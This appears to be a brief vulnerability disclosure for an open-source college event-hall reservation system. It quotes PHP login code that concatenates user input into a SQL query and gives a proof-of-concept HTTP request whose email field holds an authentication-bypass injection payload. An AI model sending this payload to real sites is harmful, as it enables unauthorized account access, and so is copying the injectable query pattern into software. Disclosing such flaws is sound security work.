# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - SQL Injection Auth Bypass login.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /login.php

## Code
```php
  if(isset($_POST['user'])){
                $email=$_POST['email'];
                $password=$_POST['password'];
                $password=md5($password);
                $email=$email.'@sairam.edu.in';
                $sql="SELECT * FROM tbl_user WHERE user_email='$email' AND user_password='$password'";
                $res=mysqli_query($conn,$sql);
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /login.php HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

email=NoChizPlz%27+or+1%3D1+limit+1+%23&password=NoChizPlz&user=Login
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/f6d9a073-091c-4323-ba54-a2383b7e7126)

